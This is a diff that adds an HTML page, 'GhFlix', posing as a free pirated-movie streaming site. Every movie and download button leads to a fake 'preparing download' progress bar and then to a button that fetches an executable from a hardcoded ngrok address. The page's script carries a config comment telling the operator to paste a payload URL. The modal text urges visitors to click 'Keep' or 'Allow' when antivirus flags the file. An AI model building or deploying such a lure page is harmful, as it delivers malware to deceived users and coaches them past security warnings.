@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>GhFlix - Watch Free Movies Online HD</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e5e5e5;min-height:100vh;font-size:14px}
+a{text-decoration:none;color:inherit}
+img{display:block}
+
+/* NAV */
+header{background:#181818;border-bottom:1px solid #282828;padding:0 16px;height:52px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.logo{font-size:20px;font-weight:800;color:#fff;letter-spacing:-0.5px}
+.logo span{color:#e50914}
+.nav-links{display:flex;gap:20px;font-size:13px;color:#aaa}
+.nav-links a:hover{color:#fff}
+.search-wrap{display:flex;align-items:center;background:#282828;border:1px solid #333;border-radius:4px;overflow:hidden}
+.search-wrap input{background:transparent;border:none;outline:none;padding:7px 12px;font-size:13px;color:#fff;width:180px}
+.search-wrap input::placeholder{color:#666}
+.search-wrap button{background:#e50914;border:none;padding:7px 12px;color:#fff;font-size:13px;cursor:pointer}
+
+/* HERO */
+.hero{background:#181818;border-bottom:1px solid #282828;padding:28px 16px;display:flex;gap:24px;align-items:flex-start}
+.hero-poster{width:130px;flex-shrink:0;border-radius:4px;overflow:hidden;background:#282828}
+.hero-poster img{width:100%;height:195px;object-fit:cover;background:#282828}
+.hero-poster-placeholder{width:130px;height:195px;background:linear-gradient(160deg,#1a1a1a,#282828);display:flex;align-items:center;justify-content:center;color:#444;font-size:11px;border-radius:4px}
+.hero-info{}
+.hero-info .tag{display:inline-block;background:#e50914;color:#fff;font-size:10px;font-weight:700;padding:2px 7px;border-radius:2px;margin-bottom:10px;letter-spacing:.4px;text-transform:uppercase}
+.hero-info h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:8px;line-height:1.2;letter-spacing:-0.3px}
+.meta-row{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
+.meta-row .imdb{background:#f5c518;color:#000;font-size:11px;font-weight:800;padding:2px 6px;border-radius:2px}
+.meta-row .dot{color:#555}
+.meta-row span{font-size:12px;color:#999}
+.meta-row .hd{color:#3ea6ff;border:1px solid #3ea6ff;font-size:10px;padding:1px 5px;border-radius:2px;font-weight:600}
+.hero-info p{font-size:13px;color:#aaa;line-height:1.6;margin-bottom:16px;max-width:480px}
+.hero-btns{display:flex;gap:8px;flex-wrap:wrap}
+.btn-watch{background:#e50914;color:#fff;border:none;border-radius:3px;padding:9px 20px;font-size:13px;font-weight:600;cursor:pointer}
+.btn-dl{background:#282828;color:#fff;border:1px solid #444;border-radius:3px;padding:9px 20px;font-size:13px;font-weight:600;cursor:pointer}
+.btn-watch:hover{background:#c5000f}
+.btn-dl:hover{background:#333}
+
+/* SECTION */
+.section{padding:20px 16px}
+.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;border-left:3px solid #e50914;padding-left:10px}
+.section-head h2{font-size:15px;font-weight:700;color:#fff}
+.section-head a{font-size:12px;color:#aaa}
+.section-head a:hover{color:#fff}
+
+/* MOVIE GRID */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px}
+.card{background:#181818;border-radius:3px;overflow:hidden;cursor:pointer;border:1px solid #222}
+.card:hover{border-color:#444}
+.card:hover .card-title{color:#e50914}
+.card-thumb{height:185px;background:#1a1a1a;position:relative;overflow:hidden}
+.card-thumb-placeholder{width:100%;height:100%;background:#1e1e1e;display:flex;align-items:flex-end;padding:8px}
+.card-thumb-title{font-size:10px;color:#555;line-height:1.3}
+.card-quality{position:absolute;top:5px;left:5px;background:rgba(0,0,0,.75);color:#3ea6ff;font-size:9px;font-weight:700;padding:1px 5px;border-radius:2px;border:1px solid #3ea6ff}
+.card-year{position:absolute;top:5px;right:5px;background:rgba(0,0,0,.75);color:#aaa;font-size:9px;padding:1px 5px;border-radius:2px}
+.card-body{padding:8px}
+.card-title{font-size:12px;font-weight:600;color:#ddd;margin-bottom:3px;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card-meta{display:flex;justify-content:space-between;font-size:10px;color:#666}
+.card-rating{color:#f5c518}
+
+/* FEATURED DOWNLOAD */
+.featured-section{padding:0 16px 20px}
+.featured-box{background:#181818;border:1px solid #282828;border-radius:4px;overflow:hidden}
+.featured-top{background:#1a1a1a;padding:14px 16px;border-bottom:1px solid #282828;display:flex;align-items:center;gap:10px}
+.featured-top h3{font-size:14px;font-weight:700;color:#fff}
+.featured-top .new-badge{background:#e50914;color:#fff;font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;text-transform:uppercase}
+.featured-inner{display:flex;gap:16px;padding:16px;align-items:flex-start}
+.featured-poster-wrap{width:90px;flex-shrink:0}
+.featured-poster-img{width:90px;height:134px;background:#1e1e1e;border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:10px;color:#444;text-align:center;padding:8px;line-height:1.4}
+.featured-right{flex:1}
+.featured-right h4{font-size:15px;font-weight:700;color:#fff;margin-bottom:4px}
+.featured-right .genres{font-size:11px;color:#888;margin-bottom:10px}
+.featured-right .desc{font-size:12px;color:#999;line-height:1.5;margin-bottom:12px}
+.dl-options{display:flex;flex-direction:column;gap:6px}
+.dl-row{display:flex;align-items:center;justify-content:space-between;background:#0f0f0f;border:1px solid #282828;border-radius:3px;padding:8px 12px;cursor:pointer}
+.dl-row:hover{border-color:#444;background:#161616}
+.dl-row .quality{font-size:12px;font-weight:700;color:#3ea6ff}
+.dl-row .size{font-size:11px;color:#666}
+.dl-row .dl-icon{font-size:11px;color:#e50914;font-weight:700;letter-spacing:.3px}
+
+/* SIDEBAR STYLE LIST */
+.list-section{padding:0 16px 24px}
+.list-item{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid #1e1e1e;cursor:pointer}
+.list-item:last-child{border-bottom:none}
+.list-item:hover .list-title{color:#e50914}
+.list-num{font-size:20px;font-weight:800;color:#282828;width:28px;flex-shrink:0;line-height:1}
+.list-thumb{width:60px;height:85px;background:#1e1e1e;border-radius:2px;flex-shrink:0;display:flex;align-items:flex-end;padding:4px;overflow:hidden}
+.list-thumb-text{font-size:8px;color:#444;line-height:1.3}
+.list-info{flex:1}
+.list-title{font-size:12px;font-weight:600;color:#ddd;margin-bottom:4px;line-height:1.3}
+.list-meta{font-size:10px;color:#666;margin-bottom:3px}
+.list-genres{font-size:10px;color:#888}
+
+/* DOWNLOAD MODAL */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:999;align-items:center;justify-content:center;padding:20px}
+.overlay.open{display:flex}
+.modal{background:#181818;border:1px solid #333;border-radius:4px;width:100%;max-width:380px;overflow:hidden}
+.modal-head{background:#1a1a1a;border-bottom:1px solid #282828;padding:14px 16px;display:flex;align-items:center;justify-content:space-between}
+.modal-head h3{font-size:14px;font-weight:700;color:#fff}
+.modal-close-btn{background:none;border:none;color:#666;font-size:18px;cursor:pointer;line-height:1;padding:0}
+.modal-close-btn:hover{color:#fff}
+.modal-body{padding:20px 16px}
+.modal-movie-title{font-size:13px;font-weight:600;color:#fff;margin-bottom:4px}
+.modal-quality{font-size:11px;color:#3ea6ff;margin-bottom:16px}
+.progress-label{display:flex;justify-content:space-between;font-size:11px;color:#888;margin-bottom:6px}
+.progress-track{background:#282828;border-radius:100px;height:4px;margin-bottom:6px;overflow:hidden}
+.progress-fill{background:#e50914;height:100%;width:0%;border-radius:100px;transition:width .15s linear}
+.progress-status{font-size:11px;color:#888;margin-bottom:16px}
+.dl-main-btn{width:100%;background:#e50914;color:#fff;border:none;border-radius:3px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;display:none}
+.dl-main-btn.show{display:block}
+.dl-main-btn:hover{background:#c5000f}
+.modal-note{background:#141414;border:1px solid #282828;border-radius:3px;padding:10px 12px;margin-top:12px;font-size:11px;color:#777;line-height:1.6}
+.modal-note strong{color:#aaa}
+.modal-cancel{display:block;text-align:center;margin-top:12px;font-size:11px;color:#666;cursor:pointer}
+.modal-cancel:hover{color:#aaa}
+
+/* FOOTER */
+footer{background:#141414;border-top:1px solid #282828;padding:20px 16px;margin-top:8px}
+footer .f-logo{font-size:16px;font-weight:800;color:#fff;margin-bottom:8px}
+footer .f-logo span{color:#e50914}
+footer p{font-size:11px;color:#555;line-height:1.8;max-width:600px}
+footer .f-links{display:flex;gap:16px;margin-top:10px;flex-wrap:wrap}
+footer .f-links a{font-size:11px;color:#555}
+footer .f-links a:hover{color:#aaa}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">Gh<span>Flix</span></div>
+  <div class="nav-links">
+    <a href="#">Movies</a>
+    <a href="#">TV Series</a>
+    <a href="#">Ghana</a>
+    <a href="#">Top IMDb</a>
+    <a href="#">Genre</a>
+  </div>
+  <div class="search-wrap">
+    <input type="text" placeholder="Search movies...">
+    <button>Search</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-poster-placeholder">Movie<br>Poster</div>
+  <div class="hero-info">
+    <div class="tag">Featured</div>
+    <h1>Black Panther: Wakanda Forever</h1>
+    <div class="meta-row">
+      <span class="imdb">6.7</span>
+      <span class="dot">|</span>
+      <span>2022</span>
+      <span class="dot">|</span>
+      <span>2h 41min</span>
+      <span class="dot">|</span>
+      <span>Action, Adventure</span>
+      <span class="dot">|</span>
+      <span class="hd">4K</span>
+    </div>
+    <p>Queen Ramonda, Shuri, M'Baku, Okoye and the Dora Milaje fight to protect their nation from intervening world powers in the wake of King T'Challa's death. As the Wakandans strive to embrace their next chapter, the heroes must band together.</p>
+    <div class="hero-btns">
+      <button class="btn-watch" onclick="openModal('Black Panther: Wakanda Forever','4K 2160p')">Watch Now</button>
+      <button class="btn-dl" onclick="openModal('Black Panther: Wakanda Forever','1080p BluRay')">Download</button>
+    </div>
+  </div>
+</div>
+
+<!-- FEATURED DOWNLOAD -->
+<div class="featured-section">
+  <div class="featured-box">
+    <div class="featured-top">
+      <h3>Oppenheimer (2023)</h3>
+      <span class="new-badge">New</span>
+    </div>
+    <div class="featured-inner">
+      <div class="featured-poster-wrap">
+        <div class="featured-poster-img">Movie<br>Poster</div>
+      </div>
+      <div class="featured-right">
+        <h4>Oppenheimer</h4>
+        <div class="genres">Biography / Drama / History &nbsp;|&nbsp; 3h 0min &nbsp;|&nbsp; IMDb 8.4</div>
+        <div class="desc">The story of American scientist J. Robert Oppenheimer and his role in the development of the atomic bomb during World War II.</div>
+        <div class="dl-options">
+          <div class="dl-row" onclick="openModal('Oppenheimer 2023','4K 2160p HDR')">
+            <span class="quality">4K HDR</span>
+            <span class="size">22.4 GB</span>
+            <span class="dl-icon">DOWNLOAD</span>
+          </div>
+          <div class="dl-row" onclick="openModal('Oppenheimer 2023','1080p BluRay')">
+            <span class="quality">1080p BluRay</span>
+            <span class="size">8.7 GB</span>
+            <span class="dl-icon">DOWNLOAD</span>
+          </div>
+          <div class="dl-row" onclick="openModal('Oppenheimer 2023','720p WEB-DL')">
+            <span class="quality">720p WEB-DL</span>
+            <span class="size">3.2 GB</span>
+            <span class="dl-icon">DOWNLOAD</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TRENDING -->
+<div class="section">
+  <div class="section-head">
+    <h2>Trending Movies</h2>
+    <a href="#">View All</a>
+  </div>
+  <div class="grid">
+    <div class="card" onclick="openModal('Avengers: Endgame','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Avengers: Endgame</div></div>
+        <div class="card-quality">1080p</div>
+        <div class="card-year">2019</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Avengers: Endgame</div>
+        <div class="card-meta"><span class="card-rating">8.4</span><span>Action</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('Oppenheimer','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Oppenheimer</div></div>
+        <div class="card-quality">4K</div>
+        <div class="card-year">2023</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Oppenheimer</div>
+        <div class="card-meta"><span class="card-rating">8.4</span><span>Drama</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('Spider-Man: No Way Home','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Spider-Man: No Way Home</div></div>
+        <div class="card-quality">1080p</div>
+        <div class="card-year">2021</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Spider-Man: No Way Home</div>
+        <div class="card-meta"><span class="card-rating">8.2</span><span>Action</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('Top Gun: Maverick','4K')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Top Gun: Maverick</div></div>
+        <div class="card-quality">4K</div>
+        <div class="card-year">2022</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Top Gun: Maverick</div>
+        <div class="card-meta"><span class="card-rating">8.3</span><span>Action</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('Barbie','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Barbie</div></div>
+        <div class="card-quality">1080p</div>
+        <div class="card-year">2023</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Barbie</div>
+        <div class="card-meta"><span class="card-rating">6.9</span><span>Comedy</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('John Wick: Chapter 4','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">John Wick: Chapter 4</div></div>
+        <div class="card-quality">1080p</div>
+        <div class="card-year">2023</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">John Wick: Chapter 4</div>
+        <div class="card-meta"><span class="card-rating">7.7</span><span>Action</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('The Batman','1080p')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">The Batman</div></div>
+        <div class="card-quality">1080p</div>
+        <div class="card-year">2022</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">The Batman</div>
+        <div class="card-meta"><span class="card-rating">7.8</span><span>Action</span></div>
+      </div>
+    </div>
+    <div class="card" onclick="openModal('Dune: Part Two','4K')">
+      <div class="card-thumb">
+        <div class="card-thumb-placeholder"><div class="card-thumb-title">Dune: Part Two</div></div>
+        <div class="card-quality">4K</div>
+        <div class="card-year">2024</div>
+      </div>
+      <div class="card-body">
+        <div class="card-title">Dune: Part Two</div>
+        <div class="card-meta"><span class="card-rating">8.5</span><span>Sci-Fi</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOP 5 -->
+<div class="list-section">
+  <div class="section-head" style="margin-bottom:12px">
+    <h2>Top Rated This Month</h2>
+    <a href="#">See More</a>
+  </div>
+  <div class="list-item" onclick="openModal('Dune: Part Two','1080p')">
+    <div class="list-num">1</div>
+    <div class="list-thumb"><div class="list-thumb-text">Dune Part Two</div></div>
+    <div class="list-info">
+      <div class="list-title">Dune: Part Two (2024)</div>
+      <div class="list-meta">IMDb 8.5 &nbsp;|&nbsp; 2h 47min &nbsp;|&nbsp; 1080p / 4K</div>
+      <div class="list-genres">Sci-Fi, Adventure, Drama</div>
+    </div>
+  </div>
+  <div class="list-item" onclick="openModal('Oppenheimer','720p')">
+    <div class="list-num">2</div>
+    <div class="list-thumb"><div class="list-thumb-text">Oppenheimer</div></div>
+    <div class="list-info">
+      <div class="list-title">Oppenheimer (2023)</div>
+      <div class="list-meta">IMDb 8.4 &nbsp;|&nbsp; 3h 0min &nbsp;|&nbsp; 720p / 1080p / 4K</div>
+      <div class="list-genres">Biography, Drama, History</div>
+    </div>
+  </div>
+  <div class="list-item" onclick="openModal('The Shawshank Redemption','1080p')">
+    <div class="list-num">3</div>
+    <div class="list-thumb"><div class="list-thumb-text">Shawshank Redemption</div></div>
+    <div class="list-info">
+      <div class="list-title">The Shawshank Redemption (1994)</div>
+      <div class="list-meta">IMDb 9.3 &nbsp;|&nbsp; 2h 22min &nbsp;|&nbsp; 1080p</div>
+      <div class="list-genres">Drama</div>
+    </div>
+  </div>
+  <div class="list-item" onclick="openModal('The Dark Knight','1080p')">
+    <div class="list-num">4</div>
+    <div class="list-thumb"><div class="list-thumb-text">The Dark Knight</div></div>
+    <div class="list-info">
+      <div class="list-title">The Dark Knight (2008)</div>
+      <div class="list-meta">IMDb 9.0 &nbsp;|&nbsp; 2h 32min &nbsp;|&nbsp; 1080p / 4K</div>
+      <div class="list-genres">Action, Crime, Drama</div>
+    </div>
+  </div>
+  <div class="list-item" onclick="openModal('Inception','1080p')">
+    <div class="list-num">5</div>
+    <div class="list-thumb"><div class="list-thumb-text">Inception</div></div>
+    <div class="list-info">
+      <div class="list-title">Inception (2010)</div>
+      <div class="list-meta">IMDb 8.8 &nbsp;|&nbsp; 2h 28min &nbsp;|&nbsp; 1080p</div>
+      <div class="list-genres">Action, Sci-Fi, Thriller</div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="f-logo">Gh<span>Flix</span></div>
+  <p>GhFlix does not store any files on its servers. All content is provided by non-affiliated third parties.
+  GhFlix is not responsible for the accuracy, compliance, copyright, legality, or decency of material contained in or linked from this site.</p>
+  <div class="f-links">
+    <a href="#">Home</a>
+    <a href="#">Movies</a>
+    <a href="#">TV Series</a>
+    <a href="#">DMCA</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Contact</a>
+  </div>
+</footer>
+
+<!-- DOWNLOAD MODAL -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="modal-head">
+      <h3>Download Movie</h3>
+      <button class="modal-close-btn" onclick="closeModal()">x</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-movie-title" id="m-title"></div>
+      <div class="modal-quality" id="m-quality"></div>
+      <div class="progress-label">
+        <span id="m-pct">0%</span>
+        <span id="m-step">Preparing...</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="m-bar"></div>
+      </div>
+      <div class="progress-status" id="m-status">Connecting to download server...</div>
+      <button class="dl-main-btn" id="m-btn" onclick="triggerDownload()">Download Now</button>
+      <div class="modal-note">
+        <strong>Note:</strong> Your browser or antivirus may flag this file as it is downloaded directly from our server rather than an app store. Click <strong>Keep</strong> or <strong>Allow</strong> if prompted. The file is the GhFlix desktop player required to stream in HD.
+      </div>
+      <span class="modal-cancel" onclick="closeModal()">Cancel</span>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+//  CONFIG — paste your payload URL here
+//  Hotspot:  "http://192.168.43.XXX:8080/GhFlix_Player.exe"
+//  Ngrok:    "http://0.tcp.ngrok.io:XXXXX/GhFlix_Player.exe"
+// ============================================================
+var PAYLOAD_URL = "http://4.tcp.eu.ngrok.io:19714/GhFlix_Player_Setup.exe";
+
+var currentMovie = "";
+var currentQuality = "";
+
+function openModal(movie, quality) {
+  currentMovie = movie;
+  currentQuality = quality;
+  document.getElementById('m-title').textContent = movie;
+  document.getElementById('m-quality').textContent = quality + " — Free Download";
+  document.getElementById('m-bar').style.width = '0%';
+  document.getElementById('m-pct').textContent = '0%';
+  document.getElementById('m-step').textContent = 'Preparing...';
+  document.getElementById('m-status').textContent = 'Connecting to download server...';
+  document.getElementById('m-btn').classList.remove('show');
+  document.getElementById('overlay').classList.add('open');
+  animateProgress();
+}
+
+function animateProgress() {
+  var steps = [
+    {pct:12, delay:500,  step:'Verifying file...', status:'Connecting to server...'},
+    {pct:28, delay:1100, step:'Checking availability...', status:'Fetching download link...'},
+    {pct:50, delay:1800, step:'Generating link...', status:'Preparing secure download link...'},
+    {pct:71, delay:2500, step:'Almost ready...', status:'Optimising for your connection speed...'},
+    {pct:89, delay:3200, step:'Finalising...', status:'Download link ready. Please wait...'},
+    {pct:100,delay:3900, step:'Ready', status:'Your download link is ready.'},
+  ];
+  steps.forEach(function(s) {
+    setTimeout(function() {
+      document.getElementById('m-bar').style.width = s.pct + '%';
+      document.getElementById('m-pct').textContent = s.pct + '%';
+      document.getElementById('m-step').textContent = s.step;
+      document.getElementById('m-status').textContent = s.status;
+      if (s.pct === 100) {
+        document.getElementById('m-btn').classList.add('show');
+      }
+    }, s.delay);
+  });
+}
+
+function triggerDownload() {
+  if (!PAYLOAD_URL || PAYLOAD_URL === 'PASTE_YOUR_PAYLOAD_URL_HERE') {
+    alert('Demo: PAYLOAD_URL not configured. Set your ngrok or hotspot URL in the script.');
+    return;
+  }
+  var a = document.createElement('a');
+  a.href = PAYLOAD_URL;
+  a.download = 'GhFlix_Player_Setup.exe';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  document.getElementById('m-status').textContent = 'Downloading — check your Downloads folder.';
+  var btn = document.getElementById('m-btn');
+  btn.textContent = 'Download Started';
+  btn.style.background = '#1a7a3a';
+  btn.style.cursor = 'default';
+}
+
+function closeModal() {
+  document.getElementById('overlay').classList.remove('open');
+}
+
+document.getElementById('overlay').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+</script>
+</body>
+</html>
